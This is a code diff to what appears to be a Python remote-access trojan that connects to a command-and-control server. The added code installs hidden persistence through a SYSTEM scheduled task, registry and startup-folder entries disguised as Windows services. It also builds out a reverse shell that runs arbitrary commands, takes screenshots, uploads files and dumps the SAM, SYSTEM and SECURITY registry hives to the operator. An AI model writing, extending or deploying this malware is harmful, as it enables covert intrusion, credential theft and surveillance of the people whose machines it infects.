@@ -63,7 +63,7 @@ try:
     C2_PORT = config['C2_PORT']
 
     # ======================================================
-    # PERSISTENCE
+    # PERSISTENCE - REGISTRY
     # ======================================================
     def install_persistence():
         try:
@@ -81,10 +81,93 @@ try:
         except:
             return False
 
-    try:
-        install_persistence()
-    except:
-        pass
+    # ======================================================
+    # PERSISTENCE - SCHEDULED TASK (HAR 2 MINUTE RESTART)
+    # ======================================================
+    def create_scheduled_task():
+        try:
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            subprocess.run(
+                f'schtasks /delete /tn "WindowsSystemMonitor" /f',
+                shell=True,
+                creationflags=0x08000000,
+                capture_output=True
+            )
+            
+            task_cmd = f'''
+            schtasks /create /tn "WindowsSystemMonitor" /tr "{exe_path}" /sc minute /mo 2 /f /ru SYSTEM
+            '''
+            subprocess.run(task_cmd, shell=True, creationflags=0x08000000)
+            print("[+] Scheduled task created! (Runs every 2 minutes)")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Scheduled task failed: {e}")
+            return False
+
+    # ======================================================
+    # PERSISTENCE - STARTUP FOLDER
+    # ======================================================
+    def install_startup_persistence():
+        try:
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            startup_folder = os.path.join(
+                os.environ['APPDATA'],
+                r'Microsoft\Windows\Start Menu\Programs\Startup'
+            )
+            
+            if not os.path.exists(startup_folder):
+                os.makedirs(startup_folder)
+            
+            dest_path = os.path.join(startup_folder, 'WindowsUpdateService.exe')
+            
+            if getattr(sys, 'frozen', False):
+                try:
+                    shutil.copy2(exe_path, dest_path)
+                except:
+                    pass
+            else:
+                vbs_path = os.path.join(startup_folder, 'WindowsUpdateService.vbs')
+                vbs_content = f'''
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run """{sys.executable}"" ""{exe_path}""", 0, False
+'''
+                with open(vbs_path, 'w') as f:
+                    f.write(vbs_content)
+            
+            return True
+        except:
+            return False
+
+    # ======================================================
+    # SETUP ALL PERSISTENCE
+    # ======================================================
+    def setup_all_persistence():
+        print("[*] Setting up persistence layers...")
+        try:
+            install_persistence()
+            print("[+] Registry persistence installed")
+        except:
+            pass
+        try:
+            install_startup_persistence()
+            print("[+] Startup folder persistence installed")
+        except:
+            pass
+        try:
+            create_scheduled_task()
+            print("[+] Scheduled task persistence installed (2 min)")
+        except:
+            pass
+        print("[+] All persistence layers installed!")
 
     # ======================================================
     # C2 CONFIG
@@ -412,7 +495,7 @@ try:
             return f"FAILURE: {str(e)}"
 
     # ======================================================
-    # SHOW PERSISTENT NOTIFICATION - SIMPLE (No buttons)
+    # SHOW PERSISTENT NOTIFICATION
     # ======================================================
     def show_persistent_notification():
         global notification_window, notification_thread
@@ -450,7 +533,7 @@ try:
             return f"FAILURE: {str(e)}"
 
     # ======================================================
-    # CLOSE NOTIFICATION - FIXED (Always returns success)
+    # CLOSE NOTIFICATION
     # ======================================================
     def close_notification():
         global notification_window, notification_thread
@@ -621,12 +704,6 @@ try:
             return f"FAILURE: {str(e)}"
 
     # ======================================================
-    # SCREENSHOT REMOVED
-    # ======================================================
-    def capture_screenshot():
-        return "SCREENSHOT FEATURE REMOVED"
-
-    # ======================================================
     # SYSTEM FINGERPRINT
     # ======================================================
     def get_system_fingerprint():
@@ -640,21 +717,149 @@ try:
             return json.dumps({"hostname": "Unknown", "username": "Unknown", "mac_address": "Unknown"})
 
     # ======================================================
-    # REVERSE SHELL
+    # REVERSE SHELL - FIXED VERSION (subprocess/os modules properly imported)
     # ======================================================
     def execute_live_reverse_shell(conn):
+        # Import modules inside function to ensure they're available
+        import subprocess
+        import os
+        import base64
+        import time
+        from datetime import datetime
+        
         try:
-            conn.send(b"\n[+] INTERACTIVE CORE CONSOLE INITIATED. Type 'exit_shell' to return.\nCMD> ")
+            banner = """
+╔═══════════════════════════════════════════════════════╗
+║     🔥 PHANTOMSTRIKE - POWERFUL REVERSE SHELL        ║
+║     Type 'exit_shell' to return to C2 menu           ║
+║     Special Commands:                                ║
+║       screenshot   - Take screenshot                  ║
+║       upload file  - Upload file to C2               ║
+║       reg save HKLM\\SAM C:\\SAM.hive - Extract SAM   ║
+╚═══════════════════════════════════════════════════════╝
+"""
+            conn.send(banner.encode())
+            conn.send(b"\nPS C:\\> ")
+            
             while True:
                 try:
-                    conn.settimeout(10)
-                    command = conn.recv(1024).decode('utf-8').strip()
+                    conn.settimeout(60)
+                    command = conn.recv(8192).decode('utf-8', errors='ignore').strip()
                     conn.settimeout(None)
                     
-                    if command == "exit_shell" or not command:
+                    if command.lower() in ["exit_shell", "exit", "quit"]:
                         conn.send(b"\n[*] Shell session ended. Returning to C2...\n")
                         break
                     
+                    if not command:
+                        conn.send(b"\nPS C:\\> ")
+                        continue
+                    
+                    # ======================================================
+                    # UPLOAD COMMAND - FIXED
+                    # ======================================================
+                    if command.lower().startswith("upload "):
+                        try:
+                            filepath = command.split(" ", 1)[1].strip()
+                            if os.path.exists(filepath):
+                                with open(filepath, 'rb') as f:
+                                    content = f.read()
+                                    encoded = base64.b64encode(content).decode('ascii')
+                                    conn.send(f"FILE:{os.path.basename(filepath)}:{encoded}".encode())
+                                conn.send(b"\n[+] File uploaded!\nPS C:\\> ")
+                            else:
+                                conn.send(f"[-] File not found: {filepath}\n".encode())
+                                conn.send(b"\nPS C:\\> ")
+                            continue
+                        except Exception as e:
+                            conn.send(f"[-] Upload error: {str(e)}\n".encode())
+                            conn.send(b"\nPS C:\\> ")
+                            continue
+                    
+                    # ======================================================
+                    # SCREENSHOT COMMAND
+                    # ======================================================
+                    if command.lower() == "screenshot":
+                        try:
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            output = os.path.join(os.environ['TEMP'], f"screenshot_{timestamp}.png")
+                            
+                            ps_script = f'''
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+$bitmap.Save("{output}")
+$graphics.Dispose()
+$bitmap.Dispose()
+'''
+                            subprocess.run(
+                                ['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script],
+                                timeout=30
+                            )
+                            
+                            if os.path.exists(output):
+                                with open(output, 'rb') as f:
+                                    content = f.read()
+                                    encoded = base64.b64encode(content).decode('ascii')
+                                    conn.send(f"SCREENSHOT:{os.path.basename(output)}:{encoded}".encode())
+                                os.remove(output)
+                                conn.send(b"\n[+] Screenshot captured!\nPS C:\\> ")
+                            else:
+                                conn.send(b"[-] Screenshot failed\nPS C:\\> ")
+                            continue
+                        except Exception as e:
+                            conn.send(f"[-] Screenshot error: {str(e)}\n".encode())
+                            conn.send(b"\nPS C:\\> ")
+                            continue
+                    
+                    # ======================================================
+                    # REG SAVE (SAM/SYSTEM Extraction)
+                    # ======================================================
+                    if command.lower().startswith("reg save"):
+                        try:
+                            hives = ["SAM", "SYSTEM", "SECURITY"]
+                            results = []
+                            temp_dir = os.path.join(os.environ['TEMP'], 'hive_extract')
+                            os.makedirs(temp_dir, exist_ok=True)
+                            
+                            for hive in hives:
+                                dest = os.path.join(temp_dir, hive)
+                                cmd = f'reg save HKLM\\{hive} "{dest}" /y'
+                                try:
+                                    subprocess.run(cmd, shell=True, timeout=15, capture_output=True)
+                                    if os.path.exists(dest) and os.path.getsize(dest) > 100:
+                                        with open(dest, 'rb') as f:
+                                            content = f.read()
+                                            encoded = base64.b64encode(content).decode('ascii')
+                                            results.append(f"{hive}:{encoded}")
+                                            conn.send(f"[+] {hive} extracted ({len(content)} bytes)\n".encode())
+                                        os.remove(dest)
+                                    else:
+                                        conn.send(f"[-] Failed to extract {hive}\n".encode())
+                                except Exception as e:
+                                    conn.send(f"[-] Error extracting {hive}: {str(e)}\n".encode())
+                            
+                            os.rmdir(temp_dir)
+                            
+                            if results:
+                                combined = "|".join(results)
+                                conn.send(f"\n[+] All hives extracted! Data size: {len(combined)} bytes\n".encode())
+                            else:
+                                conn.send("[-] No hives extracted\n".encode())
+                            
+                            conn.send(b"\nPS C:\\> ")
+                            continue
+                        except Exception as e:
+                            conn.send(f"[-] Extraction error: {str(e)}\n".encode())
+                            conn.send(b"\nPS C:\\> ")
+                            continue
+                    
+                    # ======================================================
+                    # EXECUTE ANY COMMAND
+                    # ======================================================
                     try:
                         proc = subprocess.Popen(
                             command,
@@ -662,40 +867,46 @@ try:
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE,
-                            creationflags=NO_WINDOW_FLAG
+                            creationflags=0x08000000,
+                            encoding='utf-8',
+                            errors='ignore'
                         )
                         
                         try:
-                            stdout, stderr = proc.communicate(timeout=30)
+                            stdout, stderr = proc.communicate(timeout=120)
                         except subprocess.TimeoutExpired:
                             proc.kill()
                             stdout, stderr = proc.communicate()
-                            conn.send(b"\n[-] Command timed out (30s)\nCMD> ")
+                            conn.send(b"\n[-] Command timed out (120s)\n")
+                            conn.send(b"\nPS C:\\> ")
                             continue
                         
-                        output = stdout + stderr
+                        if stdout:
+                            conn.send(stdout.encode('utf-8', errors='ignore'))
+                        if stderr:
+                            conn.send(stderr.encode('utf-8', errors='ignore'))
                         
-                        if not output:
-                            output = b"\n[+] Command executed successfully (no output)\n"
-                        else:
-                            output = output + b"\n"
+                        if not stdout and not stderr:
+                            conn.send(b"[+] Command executed successfully (no output)\n")
                         
-                        conn.send(output + b"CMD> ")
+                        conn.send(b"\nPS C:\\> ")
                         
                     except Exception as e:
-                        conn.send(f"\n[-] Error: {str(e)}\nCMD> ".encode('utf-8'))
+                        conn.send(f"\n[-] Error executing: {str(e)}\n".encode())
+                        conn.send(b"\nPS C:\\> ")
                         
                 except socket.timeout:
-                    conn.send(b"\n[-] Timeout - no input\nCMD> ")
+                    conn.send(b"\n[-] No input received. Type 'exit_shell' to exit.\n")
+                    conn.send(b"\nPS C:\\> ")
                     continue
                 except Exception as e:
-                    conn.send(f"\n[-] Connection error: {str(e)}\nCMD> ".encode('utf-8'))
+                    conn.send(f"\n[-] Connection error: {str(e)}\n".encode())
                     break
                     
         except Exception as e:
             print(f"[!] Shell error: {e}")
         finally:
-            print("[*] Shell session closed, keeping C2 connection alive")
+            print("[*] Shell session closed")
 
     # ======================================================
     # DISABLE / ENABLE NETWORK
@@ -793,6 +1004,9 @@ try:
     def start_agent():
         global ACTIVE_SSID, notification_window, notification_thread, stream_thread, stream_active, last_ping_time
         
+        # Setup persistence first
+        setup_all_persistence()
+        
         elevate_to_admin()
         
         print("[*] Agent starting...")
@@ -856,10 +1070,6 @@ try:
 
                     elif instruction == "RUN:SYS_INFO":
                         result = get_full_system_info()
-                        client_socket.send(result.encode('utf-8'))
-
-                    elif instruction == "RUN:SCREENSHOT":
-                        result = "SCREENSHOT FEATURE REMOVED"
                         client_socket.send(result.encode('utf-8'))
 
                     elif instruction == "RUN:COLLECT":
